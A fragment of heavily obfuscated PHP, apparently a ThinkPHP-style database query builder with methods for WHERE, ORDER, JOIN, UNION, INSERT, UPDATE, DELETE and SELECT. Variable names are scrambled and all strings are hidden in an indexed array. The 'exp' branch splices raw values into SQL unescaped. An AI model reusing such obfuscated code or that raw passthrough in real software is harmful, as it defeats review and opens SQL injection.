implode($bÓĞ¾º‘Å[47], $AĞéŒ¥Óë); } protected function bindParam($Cî¿ê”¸©à, $f“è“½öİ­) { $this->bind[$_SERVER[ã®Â„Éæ¹¤][4] . $Cî¿ê”¸©à] = $f“è“½öİ­; } protected function parseBind($a­«µáßÙ¥) { $a­«µáßÙ¥ = array_merge($this->bind, $a­«µáßÙ¥); $this->bind = array(); return $a­«µáßÙ¥; } function parseKey(&$A›ÌÒÂÑ‡´, $a†Æ„³ŸÈ° = true) { if ($a†Æ„³ŸÈ°) { $A›ÌÒÂÑ‡´ = $this->parseKeyCheck($A›ÌÒÂÑ‡´); } return $A›ÌÒÂÑ‡´; } function parseKeyCheck($cëĞÉ›ƒò) { $F£Ğ¶ŠÓóÜ =& $_SERVER[ã®Â„Éæ¹¤]; $cëĞÉ›ƒò = trim($cëĞÉ›ƒò); if (!preg_match($F£Ğ¶ŠÓóÜ[927], $cëĞÉ›ƒò)) { think_exception($F£Ğ¶ŠÓóÜ[928] . $cëĞÉ›ƒò); } return $cëĞÉ›ƒò; } protected function parseValue($f¥åˆ‹ÛÁ‡) { $E‰Áï•Ê‡ =& $_SERVER[ã®Â„Éæ¹¤]; if (is_string($f¥åˆ‹ÛÁ‡)) { $f¥åˆ‹ÛÁ‡ = $E‰Áï•Ê‡[890] . $this->escapeString($f¥åˆ‹ÛÁ‡) . $E‰Áï•Ê‡[890]; } elseif (isset($f¥åˆ‹ÛÁ‡[0]) && is_string($f¥åˆ‹ÛÁ‡[0]) && strtolower($f¥åˆ‹ÛÁ‡[0]) == $E‰Áï•Ê‡[285]) { $f¥åˆ‹ÛÁ‡ = $this->escapeString($f¥åˆ‹ÛÁ‡[1]); } elseif (is_array($f¥åˆ‹ÛÁ‡)) { $f¥åˆ‹ÛÁ‡ = array_map(array($this, $E‰Áï•Ê‡[891]), $f¥åˆ‹ÛÁ‡); } elseif (is_bool($f¥åˆ‹ÛÁ‡)) { $f¥åˆ‹ÛÁ‡ = $f¥åˆ‹ÛÁ‡ ? $E‰Áï•Ê‡[83] : $E‰Áï•Ê‡[470]; } elseif (is_null($f¥åˆ‹ÛÁ‡)) { $f¥åˆ‹ÛÁ‡ = $E‰Áï•Ê‡[99]; } return $f¥åˆ‹ÛÁ‡; } protected function parseField($f…æŸ×µé) { $c†«‰æÂˆ =& $_SERVER[ã®Â„Éæ¹¤]; if (is_string($f…æŸ×µé) && strpos($f…æŸ×µé, $c†«‰æÂˆ[47])) { $f…æŸ×µé = explode($c†«‰æÂˆ[47], $f…æŸ×µé); } if (is_array($f…æŸ×µé)) { $aïªò‡š·³ = array(); foreach ($f…æŸ×µé as $FÏæ°Ó¦ùó => $c¯¢‚óµ†) { if (!is_numeric($FÏæ°Ó¦ùó)) { $aïªò‡š·³[] = $this->parseKey($FÏæ°Ó¦ùó) . $c†«‰æÂˆ[929] . $this->parseKey($c¯¢‚óµ†); } else { $aïªò‡š·³[] = $this->parseKey($c¯¢‚óµ†); } } $cğ… ®Ùœ¸ = implode($c†«‰æÂˆ[47], $aïªò‡š·³); } elseif (is_string($f…æŸ×µé) && !empty($f…æŸ×µé)) { $cğ… ®Ùœ¸ = $f…æŸ×µé; } else { $cğ… ®Ùœ¸ = $c†«‰æÂˆ[176]; } return $cğ… ®Ùœ¸; } protected function parseTable($FÂ†äªá˜è) { $FØñà‹­Ìê =& $_SERVER[ã®Â„Éæ¹¤]; if (is_array($FÂ†äªá˜è)) { $a•®„•¥À™ = array(); foreach ($FÂ†äªá˜è as $eó´…ç—§± => $eã´ÅÒöâ) { if (!is_numeric($eó´…ç—§±)) { $a•®„•¥À™[] = $this->parseKey($eó´…ç—§±) . $FØñà‹­Ìê[50] . $this->parseKey($eã´ÅÒöâ); } else { $a•®„•¥À™[] = $this->parseKey($eó´…ç—§±); } } $FÂ†äªá˜è = $a•®„•¥À™; } elseif (is_string($FÂ†äªá˜è)) { if (strstr($FÂ†äªá˜è, $FØñà‹­Ìê[50])) { return $FÂ†äªá˜è; } $FÂ†äªá˜è = explode($FØñà‹­Ìê[47], $FÂ†äªá˜è); array_walk($FÂ†äªá˜è, array($this, $FØñà‹­Ìê[839])); } return $FØñà‹­Ìê[930] . trim(implode($FØñà‹­Ìê[931], $FÂ†äªá˜è), $FØñà‹­Ìê[845]) . $FØñà‹­Ìê[930]; } protected function parseWhere($c¨ŒÊœÁÏš) { $f‚ˆšÄ½á³ =& $_SERVER[ã®Â„Éæ¹¤]; $dâ¹ñ¨Ï‚ = $f‚ˆšÄ½á³[33]; if (is_string($c¨ŒÊœÁÏš)) { $dâ¹ñ¨Ï‚ = $c¨ŒÊœÁÏš; } else { $CŒô‡åØÌ = isset($c¨ŒÊœÁÏš[$f‚ˆšÄ½á³[932]]) ? strtoupper($c¨ŒÊœÁÏš[$f‚ˆšÄ½á³[932]]) : $f‚ˆšÄ½á³[33]; if (in_array($CŒô‡åØÌ, array($f‚ˆšÄ½á³[933], $f‚ˆšÄ½á³[934], $f‚ˆšÄ½á³[935]))) { $CŒô‡åØÌ = $f‚ˆšÄ½á³[50] . $CŒô‡åØÌ . $f‚ˆšÄ½á³[50]; unset($c¨ŒÊœÁÏš[$f‚ˆšÄ½á³[932]]); } else { $CŒô‡åØÌ = $f‚ˆšÄ½á³[936]; } foreach ($c¨ŒÊœÁÏš as $e†æô”“‚„ => $f†æ¤§‚) { $dâ¹ñ¨Ï‚ .= $f‚ˆšÄ½á³[265]; if (is_numeric($e†æô”“‚„)) { $e†æô”“‚„ = $f‚ˆšÄ½á³[937]; } if (0 === strpos($e†æô”“‚„, $f‚ˆšÄ½á³[70])) { $dâ¹ñ¨Ï‚ .= $this->parseThinkWhere($e†æô”“‚„, $f†æ¤§‚); } else { if (!preg_match($f‚ˆšÄ½á³[938], trim($e†æô”“‚„))) { think_exception(think_lang($f‚ˆšÄ½á³[939]) . $f‚ˆšÄ½á³[4] . $e†æô”“‚„); } $bèÂ¿ŒÅ† = is_array($f†æ¤§‚) && isset($f†æ¤§‚[$f‚ˆšÄ½á³[940]]); $e†æô”“‚„ = trim($e†æô”“‚„); if (strpos($e†æô”“‚„, $f‚ˆšÄ½á³[271])) { $eä¹çŒ…Šõ = explode($f‚ˆšÄ½á³[271], $e†æô”“‚„); $D¯ÑÄÑÀ¸‰ = array(); foreach ($eä¹çŒ…Šõ as $D°Øâƒó£Ş => $e¯ŸÓç°‹¾) { $cğĞÔ”’² = $bèÂ¿ŒÅ† ? $f†æ¤§‚[$D°Øâƒó£Ş] : $f†æ¤§‚; $D¯ÑÄÑÀ¸‰[] = $f‚ˆšÄ½á³[248] . $this->parseWhereItem($this->parseKey($e¯ŸÓç°‹¾), $cğĞÔ”’²) . $f‚ˆšÄ½á³[838]; } $dâ¹ñ¨Ï‚ .= implode($f‚ˆšÄ½á³[941], $D¯ÑÄÑÀ¸‰); } elseif (strpos($e†æô”“‚„, $f‚ˆšÄ½á³[272])) { $eä¹çŒ…Šõ = explode($f‚ˆšÄ½á³[272], $e†æô”“‚„); $D¯ÑÄÑÀ¸‰ = array(); foreach ($eä¹çŒ…Šõ as $D°Øâƒó£Ş => $e¯ŸÓç°‹¾) { $cğĞÔ”’² = $bèÂ¿ŒÅ† ? $f†æ¤§‚[$D°Øâƒó£Ş] : $f†æ¤§‚; $D¯ÑÄÑÀ¸‰[] = $f‚ˆšÄ½á³[248] . $this->parseWhereItem($this->parseKey($e¯ŸÓç°‹¾), $cğĞÔ”’²) . $f‚ˆšÄ½á³[838]; } $dâ¹ñ¨Ï‚ .= implode($f‚ˆšÄ½á³[936], $D¯ÑÄÑÀ¸‰); } else { $dâ¹ñ¨Ï‚ .= $this->parseWhereItem($this->parseKey($e†æô”“‚„), $f†æ¤§‚); } } $dâ¹ñ¨Ï‚ .= $f‚ˆšÄ½á³[266] . $CŒô‡åØÌ; } $dâ¹ñ¨Ï‚ = substr($dâ¹ñ¨Ï‚, 0, -strlen($CŒô‡åØÌ)); } return empty($dâ¹ñ¨Ï‚) ? $f‚ˆšÄ½á³[33] : $f‚ˆšÄ½á³[942] . $dâ¹ñ¨Ï‚; } protected function parseWhereItem($E»óäæÕâ, $a¦‰ƒœÑîÆ) { $F±è®ĞŒÌÓ =& $_SERVER[ã®Â„Éæ¹¤]; $E¸è‘„£º‰ = $F±è®ĞŒÌÓ[33]; if (is_array($a¦‰ƒœÑîÆ)) { if (is_string($a¦‰ƒœÑîÆ[0])) { $eËÔŠŠÁ´° = strtolower($a¦‰ƒœÑîÆ[0]); if (in_array($a¦‰ƒœÑîÆ[0], array($F±è®ĞŒÌÓ[925], $F±è®ĞŒÌÓ[943], $F±è®ĞŒÌÓ[944], $F±è®ĞŒÌÓ[945], $F±è®ĞŒÌÓ[946], $F±è®ĞŒÌÓ[947]))) { $E¸è‘„£º‰ .= $E»óäæÕâ . $F±è®ĞŒÌÓ[50] . $a¦‰ƒœÑîÆ[0] . $F±è®ĞŒÌÓ[50] . $this->parseValue($a¦‰ƒœÑîÆ[1]); } elseif (preg_match($F±è®ĞŒÌÓ[948], $a¦‰ƒœÑîÆ[0])) { $E¸è‘„£º‰ .= $E»óäæÕâ . $F±è®ĞŒÌÓ[50] . $this->exp[$eËÔŠŠÁ´°] . $F±è®ĞŒÌÓ[50] . $this->parseValue($a¦‰ƒœÑîÆ[1]); } elseif (preg_match($F±è®ĞŒÌÓ[949], $a¦‰ƒœÑîÆ[0])) { if (is_array($a¦‰ƒœÑîÆ[1])) { $B‘§•’Î±¢ = isset($a¦‰ƒœÑîÆ[2]) ? strtoupper($a¦‰ƒœÑîÆ[2]) : $F±è®ĞŒÌÓ[934]; if (in_array($B‘§•’Î±¢, array($F±è®ĞŒÌÓ[933], $F±è®ĞŒÌÓ[934], $F±è®ĞŒÌÓ[935]))) { $f³ª²Ö›ãğ = array(); foreach ($a¦‰ƒœÑîÆ[1] as $DÑ•¾Ğ«í) { $f³ª²Ö›ãğ[] = $E»óäæÕâ . $F±è®ĞŒÌÓ[50] . $this->exp[$eËÔŠŠÁ´°] . $F±è®ĞŒÌÓ[50] . $this->parseValue($DÑ•¾Ğ«í); } $E¸è‘„£º‰ .= $F±è®ĞŒÌÓ[248] . implode($F±è®ĞŒÌÓ[50] . $B‘§•’Î±¢ . $F±è®ĞŒÌÓ[50], $f³ª²Ö›ãğ) . $F±è®ĞŒÌÓ[838]; } } else { $E¸è‘„£º‰ .= $E»óäæÕâ . $F±è®ĞŒÌÓ[50] . $this->exp[$eËÔŠŠÁ´°] . $F±è®ĞŒÌÓ[50] . $this->parseValue($a¦‰ƒœÑîÆ[1]); } } elseif ($F±è®ĞŒÌÓ[285] == $eËÔŠŠÁ´°) { $E¸è‘„£º‰ .= $F±è®ĞŒÌÓ[836] . $E»óäæÕâ . $F±è®ĞŒÌÓ[50] . $a¦‰ƒœÑîÆ[1] . $F±è®ĞŒÌÓ[950]; } elseif (preg_match($F±è®ĞŒÌÓ[951], $a¦‰ƒœÑîÆ[0])) { if (isset($a¦‰ƒœÑîÆ[2]) && $F±è®ĞŒÌÓ[285] == $a¦‰ƒœÑîÆ[2]) { $E¸è‘„£º‰ .= $E»óäæÕâ . $F±è®ĞŒÌÓ[50] . $this->exp[$eËÔŠŠÁ´°] . $F±è®ĞŒÌÓ[50] . $a¦‰ƒœÑîÆ[1]; } else { if (is_string($a¦‰ƒœÑîÆ[1])) { $a¦‰ƒœÑîÆ[1] = explode($F±è®ĞŒÌÓ[47], $a¦‰ƒœÑîÆ[1]); } $aõùÉ¬‘ç¡ = implode($F±è®ĞŒÌÓ[47], $this->parseValue($a¦‰ƒœÑîÆ[1])); $E¸è‘„£º‰ .= $E»óäæÕâ . $F±è®ĞŒÌÓ[50] . $this->exp[$eËÔŠŠÁ´°] . $F±è®ĞŒÌÓ[836] . $aõùÉ¬‘ç¡ . $F±è®ĞŒÌÓ[838]; } } elseif (preg_match($F±è®ĞŒÌÓ[952], $a¦‰ƒœÑîÆ[0])) { $b™Í‰œ‰Àƒ = is_string($a¦‰ƒœÑîÆ[1]) ? explode($F±è®ĞŒÌÓ[47], $a¦‰ƒœÑîÆ[1]) : $a¦‰ƒœÑîÆ[1]; $E¸è‘„£º‰ .= $F±è®ĞŒÌÓ[836] . $E»óäæÕâ . $F±è®ĞŒÌÓ[50] . $this->exp[$eËÔŠŠÁ´°] . $F±è®ĞŒÌÓ[50] . $this->parseValue($b™Í‰œ‰Àƒ[0]) . $F±è®ĞŒÌÓ[936] . $this->parseValue($b™Í‰œ‰Àƒ[1]) . $F±è®ĞŒÌÓ[266]; } else { think_exception(think_lang($F±è®ĞŒÌÓ[939]) . $F±è®ĞŒÌÓ[4] . $a¦‰ƒœÑîÆ[0]); } } else { $BÙœÅÖ¶±æ = count($a¦‰ƒœÑîÆ); $FÉß³ô˜²œ = isset($a¦‰ƒœÑîÆ[$BÙœÅÖ¶±æ - 1]) ? strtoupper($a¦‰ƒœÑîÆ[$BÙœÅÖ¶±æ - 1]) : $F±è®ĞŒÌÓ[33]; if (in_array($FÉß³ô˜²œ, array($F±è®ĞŒÌÓ[933], $F±è®ĞŒÌÓ[934], $F±è®ĞŒÌÓ[935]))) { $BÙœÅÖ¶±æ = $BÙœÅÖ¶±æ - 1; } else { $FÉß³ô˜²œ = $F±è®ĞŒÌÓ[933]; } for ($d¡Ãö„­˜ = 0; $d¡Ãö„­˜ < $BÙœÅÖ¶±æ; $d¡Ãö„­˜++) { $b™Í‰œ‰Àƒ = is_array($a¦‰ƒœÑîÆ[$d¡Ãö„­˜]) ? $a¦‰ƒœÑîÆ[$d¡Ãö„­˜][1] : $a¦‰ƒœÑîÆ[$d¡Ãö„­˜]; if ($F±è®ĞŒÌÓ[285] == strtolower($a¦‰ƒœÑîÆ[$d¡Ãö„­˜][0])) { $E¸è‘„£º‰ .= $F±è®ĞŒÌÓ[248] . $E»óäæÕâ . $F±è®ĞŒÌÓ[50] . $b™Í‰œ‰Àƒ . $F±è®ĞŒÌÓ[950] . $FÉß³ô˜²œ . $F±è®ĞŒÌÓ[50]; } else { $DÍ¢äè¡¼š = is_array($a¦‰ƒœÑîÆ[$d¡Ãö„­˜]) ? $this->exp[strtolower($a¦‰ƒœÑîÆ[$d¡Ãö„­˜][0])] : $F±è®ĞŒÌÓ[925]; if (!$DÍ¢äè¡¼š && is_array($a¦‰ƒœÑîÆ[$d¡Ãö„­˜]) && in_array($a¦‰ƒœÑîÆ[$d¡Ãö„­˜][0], array($F±è®ĞŒÌÓ[925], $F±è®ĞŒÌÓ[943], $F±è®ĞŒÌÓ[944], $F±è®ĞŒÌÓ[945], $F±è®ĞŒÌÓ[946], $F±è®ĞŒÌÓ[947]))) { $DÍ¢äè¡¼š = $a¦‰ƒœÑîÆ[$d¡Ãö„­˜][0]; } $E¸è‘„£º‰ .= $F±è®ĞŒÌÓ[248] . $E»óäæÕâ . $F±è®ĞŒÌÓ[50] . $DÍ¢äè¡¼š . $F±è®ĞŒÌÓ[50] . $this->parseValue($b™Í‰œ‰Àƒ) . $F±è®ĞŒÌÓ[950] . $FÉß³ô˜²œ . $F±è®ĞŒÌÓ[50]; } } $E¸è‘„£º‰ = substr($E¸è‘„£º‰, 0, -4); } } else { $E¸è‘„£º‰ .= $E»óäæÕâ . $F±è®ĞŒÌÓ[953] . $this->parseValue($a¦‰ƒœÑîÆ); } return $E¸è‘„£º‰; } protected function parseThinkWhere($bùóÌÁîâˆ, $DŒƒÇ‰çñ) { $a‡Œ…Ë·É¯ =& $_SERVER[ã®Â„Éæ¹¤]; $e¹ĞÆ÷ø† = $a‡Œ…Ë·É¯[33]; switch ($bùóÌÁîâˆ) { case $a‡Œ…Ë·É¯[339]: $e¹ĞÆ÷ø† = $DŒƒÇ‰çñ; break; case $a‡Œ…Ë·É¯[937]: $e¹ĞÆ÷ø† = is_string($DŒƒÇ‰çñ) ? $DŒƒÇ‰çñ : substr($this->parseWhere($DŒƒÇ‰çñ), 6); break; case $a‡Œ…Ë·É¯[954]: parse_str($DŒƒÇ‰çñ, $B†È®…³¢); if (isset($B†È®…³¢[$a‡Œ…Ë·É¯[932]])) { $BŒ´í“µ‰ = $a‡Œ…Ë·É¯[50] . strtoupper($B†È®…³¢[$a‡Œ…Ë·É¯[932]]) . $a‡Œ…Ë·É¯[50]; unset($B†È®…³¢[$a‡Œ…Ë·É¯[932]]); } else { $BŒ´í“µ‰ = $a‡Œ…Ë·É¯[936]; } $cºŠ¢•Ô£« = array(); foreach ($B†È®…³¢ as $bƒÑ©¡é™ => $bÙ‚„†ÄÇ) { $cºŠ¢•Ô£«[] = $this->parseKey($bƒÑ©¡é™) . $a‡Œ…Ë·É¯[953] . $this->parseValue($bÙ‚„†ÄÇ); } $e¹ĞÆ÷ø† = implode($BŒ´í“µ‰, $cºŠ¢•Ô£«); break; } return $e¹ĞÆ÷ø†; } protected function parseLimit($CŠˆ­›ãÔÌ) { $a‹­¿Ø¼åÙ =& $_SERVER[ã®Â„Éæ¹¤]; return !empty($CŠˆ­›ãÔÌ) ? $a‹­¿Ø¼åÙ[48] . $CŠˆ­›ãÔÌ . $a‹­¿Ø¼åÙ[50] : $a‹­¿Ø¼åÙ[33]; } protected function parseJoin($cÏ…–Ò…ÜË) { $bó³Î‹¨Ä¶ =& $_SERVER[ã®Â„Éæ¹¤]; $E­òÉÇöŸã = $bó³Î‹¨Ä¶[33]; if (!empty($cÏ…–Ò…ÜË)) { if (is_array($cÏ…–Ò…ÜË)) { foreach ($cÏ…–Ò…ÜË as $D–í‘‡¯Â¬ => $f³àä·Ñ“ö) { if (!1 !== stripos($f³àä·Ñ“ö, $bó³Î‹¨Ä¶[955])) { $E­òÉÇöŸã .= $bó³Î‹¨Ä¶[50] . $f³àä·Ñ“ö; } else { $E­òÉÇöŸã .= $bó³Î‹¨Ä¶[956] . $f³àä·Ñ“ö; } } } else { $E­òÉÇöŸã .= $bó³Î‹¨Ä¶[956] . $cÏ…–Ò…ÜË; } } $E­òÉÇöŸã = preg_replace($bó³Î‹¨Ä¶[957], think_config($bó³Î‹¨Ä¶[863]) . $bó³Î‹¨Ä¶[958], $E­òÉÇöŸã); return $E­òÉÇöŸã; } protected function parseOrder($EÎÕÈŒò) { $F‚ŒãÊË‘… =& $_SERVER[ã®Â„Éæ¹¤]; if (is_array($EÎÕÈŒò)) { $bà”Ä²ÏÈ = array(); foreach ($EÎÕÈŒò as $Fï›‘½¢½¦ => $d¸ËªºÎªó) { if (is_numeric($Fï›‘½¢½¦)) { $bà”Ä²ÏÈ[] = $this->parseKey($d¸ËªºÎªó); } else { $d¸ËªºÎªó = in_array(strtoupper(trim($d¸ËªºÎªó)), array($F‚ŒãÊË‘…[959], $F‚ŒãÊË‘…[960])) ? $F‚ŒãÊË‘…[50] . $d¸ËªºÎªó : $F‚ŒãÊË‘…[33]; if (preg_match($F‚ŒãÊË‘…[961], $Fï›‘½¢½¦)) { $bà”Ä²ÏÈ[] = $this->parseKey($Fï›‘½¢½¦) . $d¸ËªºÎªó; } else { think_exception($F‚ŒãÊË‘…[962] . $Fï›‘½¢½¦); } } } $EÎÕÈŒò = implode($F‚ŒãÊË‘…[47], $bà”Ä²ÏÈ); } return !empty($EÎÕÈŒò) ? $F‚ŒãÊË‘…[963] . $EÎÕÈŒò : $F‚ŒãÊË‘…[33]; } protected function parseGroup($BÖ›ÛÁšÁµ) { $a”Ñ·¾àäá =& $_SERVER[ã®Â„Éæ¹¤]; return !empty($BÖ›ÛÁšÁµ) ? $a”Ñ·¾àäá[964] . $BÖ›ÛÁšÁµ : $a”Ñ·¾àäá[33]; } protected function parseHaving($e¡¿øñøğ“) { $C÷šÄ½ó¤Ø =& $_SERVER[ã®Â„Éæ¹¤]; return !empty($e¡¿øñøğ“) ? $C÷šÄ½ó¤Ø[965] . $e¡¿øñøğ“ : $C÷šÄ½ó¤Ø[33]; } protected function parseComment($e´ÁÍÖÃ¦à) { $bÃÆ±Œ‹Ùš =& $_SERVER[ã®Â„Éæ¹¤]; return !empty($e´ÁÍÖÃ¦à) ? $bÃÆ±Œ‹Ùš[966] . $e´ÁÍÖÃ¦à . $bÃÆ±Œ‹Ùš[967] : $bÃÆ±Œ‹Ùš[33]; } protected function parseDistinct($eé”çíÃ†²) { $Aä—Œ¡ÏÁš =& $_SERVER[ã®Â„Éæ¹¤]; return !empty($eé”çíÃ†²) ? $Aä—Œ¡ÏÁš[968] : $Aä—Œ¡ÏÁš[33]; } protected function parseUnion($dÕ“‘Ï–‘•) { $d¨Š´ÄŞß¶ =& $_SERVER[ã®Â„Éæ¹¤]; if (empty($dÕ“‘Ï–‘•)) { return $d¨Š´ÄŞß¶[33]; } if (isset($dÕ“‘Ï–‘•[$d¨Š´ÄŞß¶[336]])) { $c’ˆá¬ôñÒ = $d¨Š´ÄŞß¶[969]; unset($dÕ“‘Ï–‘•[$d¨Š´ÄŞß¶[336]]); } else { $c’ˆá¬ôñÒ = $d¨Š´ÄŞß¶[970]; } foreach ($dÕ“‘Ï–‘• as $a”ôØÙ™) { $a»¥Î¡‚’‹[] = $c’ˆá¬ôñÒ . (is_array($a”ôØÙ™) ? $this->buildSelectSql($a”ôØÙ™) : $a”ôØÙ™); } return implode($d¨Š´ÄŞß¶[50], $a»¥Î¡‚’‹); } public function insert($F¼ˆ‹ë®, $A‹ß›¥ÙË = array(), $a¼‚±¨…®¬ = false) { goto B²¸ÊËš›¬; f¶¸¯· ™ñ: $f¢›ŠŠ³µ .= $this->parseComment(!empty($A‹ß›¥ÙË[$B¿š±…ß‚[341]]) ? $A‹ß›¥ÙË[$B¿š±…ß‚[341]] : $B¿š±…ß‚[33]); return $this->execute($f¢›ŠŠ³µ, $this->parseBind(!empty($A‹ß›¥ÙË[$B¿š±…ß‚[273]]) ? $A‹ß›¥ÙË[$B¿š±…ß‚[273]] : array())); goto C¶ãÚõ££•; B²¸ÊËš›¬: $B¿š±…ß‚ =& $_SERVER[ã®Â„Éæ¹¤]; $bõê‰¼ˆ±­ = $e™©ìÄâö = array(); $this->model = $A‹ß›¥ÙË[$B¿š±…ß‚[269]]; goto f òğÚËÖ´; f òğÚËÖ´: foreach ($F¼ˆ‹ë® as $b…ù”Øñ‹· => $BÓÛ¥ÑÀ§Š) { if (is_array($BÓÛ¥ÑÀ§Š) && $B¿š±…ß‚[285] == $BÓÛ¥ÑÀ§Š[0]) { $e™©ìÄâö[] = $this->parseKey($b…ù”Øñ‹·); $bõê‰¼ˆ±­[] = $BÓÛ¥ÑÀ§Š[1]; } elseif (is_scalar($BÓÛ¥ÑÀ§Š) || is_null($BÓÛ¥ÑÀ§Š)) { $e™©ìÄâö[] = $this->parseKey($b…ù”Øñ‹·); $bõê‰¼ˆ±­[] = $this->parseValue($BÓÛ¥ÑÀ§Š); } } $f¢›ŠŠ³µ = ($a¼‚±¨…®¬ ? $B¿š±…ß‚[840] : $B¿š±…ß‚[841]) . $B¿š±…ß‚[842] . $this->parseTable($A‹ß›¥ÙË[$B¿š±…ß‚[267]]) . $B¿š±…ß‚[836] . implode($B¿š±…ß‚[47], $e™©ìÄâö) . $B¿š±…ß‚[837] . implode($B¿š±…ß‚[47], $bõê‰¼ˆ±­) . $B¿š±…ß‚[838]; $f¢›ŠŠ³µ .= $this->parseLock(isset($A‹ß›¥ÙË[$B¿š±…ß‚[794]]) ? $A‹ß›¥ÙË[$B¿š±…ß‚[794]] : !1); goto f¶¸¯· ™ñ; C¶ãÚõ££•: } public function selectInsert($b“îôÜË¬, $A¤‰»ÂÂä, $fÛ’„ºŞ•Ä = array()) { goto BëÀÄ–¤’¨; aŠ‡¤©‡®‡: return $this->execute($F®Â¥¼š ê, $this->parseBind(!empty($fÛ’„ºŞ•Ä[$F¼á«½š¯[273]]) ? $fÛ’„ºŞ•Ä[$F¼á«½š¯[273]] : array())); goto DÜ“£„ãÔ; BëÀÄ–¤’¨: $F¼á«½š¯ =& $_SERVER[ã®Â„Éæ¹¤]; $this->model = $fÛ’„ºŞ•Ä[$F¼á«½š¯[269]]; if (is_string($b“îôÜË¬)) { $b“îôÜË¬ = explode($F¼á«½š¯[47], $b“îôÜË¬); } goto B÷ÀÔ¹ÚÎ; B÷ÀÔ¹ÚÎ: array_walk($b“îôÜË¬, array($this, $F¼á«½š¯[839])); $F®Â¥¼š ê = $F¼á«½š¯[971] . $this->parseTable($A¤‰»ÂÂä) . $F¼á«½š¯[836] . implode($F¼á«½š¯[47], $b“îôÜË¬) . $F¼á«½š¯[950]; $F®Â¥¼š ê .= $this->buildSelectSql($fÛ’„ºŞ•Ä); goto aŠ‡¤©‡®‡; DÜ“£„ãÔ: } public function update($dœÜ‹ÓĞ‚„, $fÏêÙãê¤í) { $eíÅÛğíÅ =& $_SERVER[ã®Â„Éæ¹¤]; $this->model = $fÏêÙãê¤í[$eíÅÛğíÅ[269]]; $A «óÛœáÁ = $eíÅÛğíÅ[972] . $this->parseTable($fÏêÙãê¤í[$eíÅÛğíÅ[267]]) . $this->parseSet($dœÜ‹ÓĞ‚„) . $this->parseWhere(!empty($fÏêÙãê¤í[$eíÅÛğíÅ[263]]) ? $fÏêÙãê¤í[$eíÅÛğíÅ[263]] : $eíÅÛğíÅ[33]) . $this->parseOrder(!empty($fÏêÙãê¤í[$eíÅÛğíÅ[350]]) ? $fÏêÙãê¤í[$eíÅÛğíÅ[350]] : $eíÅÛğíÅ[33]) . $this->parseLimit(!empty($fÏêÙãê¤í[$eíÅÛğíÅ[280]]) ? $fÏêÙãê¤í[$eíÅÛğíÅ[280]] : $eíÅÛğíÅ[33]) . $this->parseLock(isset($fÏêÙãê¤í[$eíÅÛğíÅ[794]]) ? $fÏêÙãê¤í[$eíÅÛğíÅ[794]] : !1) . $this->parseComment(!empty($fÏêÙãê¤í[$eíÅÛğíÅ[341]]) ? $fÏêÙãê¤í[$eíÅÛğíÅ[341]] : $eíÅÛğíÅ[33]); return $this->execute($A «óÛœáÁ, $this->parseBind(!empty($fÏêÙãê¤í[$eíÅÛğíÅ[273]]) ? $fÏêÙãê¤í[$eíÅÛğíÅ[273]] : array())); } public function delete($EåÓª¾«ğ = array()) { $FÄäèĞÛ± =& $_SERVER[ã®Â„Éæ¹¤]; $this->model = $EåÓª¾«ğ[$FÄäèĞÛ±[269]]; $bÕ—ğ¡äÀ¶ = $FÄäèĞÛ±[973] . $this->parseTable($EåÓª¾«ğ[$FÄäèĞÛ±[267]]) . $this->parseWhere(!empty($EåÓª¾«ğ[$FÄäèĞÛ±[263]]) ? $EåÓª¾«ğ[$FÄäèĞÛ±[263]] : $FÄäèĞÛ±[33]) . $this->parseOrder(!empty($EåÓª¾«ğ[$FÄäèĞÛ±[350]]) ? $EåÓª¾«ğ[$FÄäèĞÛ±[350]] : $FÄäèĞÛ±[33]) . $this->parseLimit(!empty($EåÓª¾«ğ[$FÄäèĞÛ±[280]]) ? $EåÓª¾«ğ[$FÄäèĞÛ±[280]] : $FÄäèĞÛ±[33]) . $this->parseLock(isset($EåÓª¾«ğ[$FÄäèĞÛ±[794]]) ? $EåÓª¾«ğ[$FÄäèĞÛ±[794]] : !1) . $this->parseComment(!empty($EåÓª¾«ğ[$FÄäèĞÛ±[341]]) ? $EåÓª¾«ğ[$FÄäèĞÛ±[341]] : $FÄäèĞÛ±[33]); return $this->execute($bÕ—ğ¡äÀ¶, $this->parseBind(!empty($EåÓª¾«ğ[$FÄäèĞÛ±[273]]) ? $EåÓª¾«ğ[$FÄäèĞÛ±[273]] : array())); } public function select($Bƒí•ùƒºğ = array()) { goto E°ìÆòë; AÁÊ†Û Æ¤: if ($d‡ö’ÑÙá && !1 !== $AÂ¼Şçõ‚¡) { think_cache($CÕá‚—“šğ, $AÂ¼Şçõ‚¡, $d‡ö’ÑÙá); } return $AÂ¼Şçõ‚¡; goto eÖ¨Üà–¦ ; E°ìÆòë: $A’•¿ÀÇŒ =& $_SERVER[ã®Â„Éæ¹¤]; $this->model = $Bƒí•ùƒºğ[$A’•¿ÀÇŒ[269]]; $B¢šõ…Ü³ = $this->buildSelectSql($Bƒí•ùƒºğ); goto e‚Ñë„©¾ˆ; e‚Ñë„©¾ˆ: $d‡ö’ÑÙá = isset($Bƒí•ùƒºğ[$A’•¿ÀÇŒ[337]]) ? $Bƒí•ùƒºğ[$A’•¿ÀÇŒ[337]] : !1; if ($d‡ö’ÑÙá) { $CÕá‚—“šğ = is_string($d‡ö’ÑÙá[$A’•¿ÀÇŒ[89]]) ? $d‡ö’ÑÙá[$A’•¿ÀÇŒ[89]] : $A’•¿ÀÇŒ[974] . md5($B¢šõ…Ü³); $a†ÚäÂ‘ôĞ = think_cache($CÕá‚—“šğ, $A’•¿ÀÇŒ[33], $d‡ö’ÑÙá); if (!1 !== $a†ÚäÂ‘ôĞ) { return $a†ÚäÂ‘ôĞ; } } $AÂ¼Şçõ‚¡ = $this->query($B¢šõ…Ü³, $this->parseBind(!empty($Bƒí•ùƒºğ[$A’•¿ÀÇŒ[273]]) ? $Bƒí•ùƒºğ[$A’•¿ÀÇŒ[273]] : array())); goto AÁÊ†Û Æ¤; eÖ¨Üà–¦ : } public function buildSelectSql($A„®ÅÃ‰²æ = array()) { goto F‰ˆ£ÌÔÚË; F‰ˆ£ÌÔÚË: $B¸¢®Ôòù =& $_SERVER[ã®Â„Éæ¹¤]; if (isset($A„®ÅÃ‰²æ[$B¸¢®Ôòù[340]])) { if (strpos($A„®ÅÃ‰²æ[$B¸¢®Ôòù[340]], $B¸¢®Ôòù[47])) { list($Bİšğƒ¹ö½, $E­š¯Ë©—à) = explode($B¸¢®Ôòù[47], $A„®ÅÃ‰²æ[$B¸¢®Ôòù[340]]); } else { $Bİšğƒ¹ö½ = $A„®ÅÃ‰²æ[$B¸¢®Ôòù[340]]; } $Bİšğƒ¹ö½ = 